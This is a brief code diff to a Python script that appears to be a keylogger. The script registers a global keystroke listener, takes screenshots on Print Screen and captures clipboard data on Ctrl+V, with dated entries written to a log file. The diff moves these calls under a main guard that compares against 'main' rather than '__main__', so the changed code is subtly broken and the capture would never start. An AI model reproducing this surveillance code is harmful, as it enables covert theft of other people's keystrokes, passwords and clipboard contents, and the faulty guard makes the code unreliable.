@@ -121,9 +121,10 @@ def write_date_to_file():
         current_date = datetime.now().strftime("%m/%d/%Y %H:%M")
         file.write("\n" + ("#" * 50) + "\n[Date]: " + current_date + "\n" + ("#" * 50) + "\n")
 
-write_date_to_file()
-keyboard.add_hotkey("print screen", screenshots, suppress=False)
-keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
-
-with kb.Listener(on_press=on_press) as listener:
-    listener.join()
+if __name__ == "main":
+    write_date_to_file()
+    keyboard.add_hotkey("print screen", screenshots, suppress=False)
+    keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
+    
+    with kb.Listener(on_press=on_press) as listener:
+        listener.join()
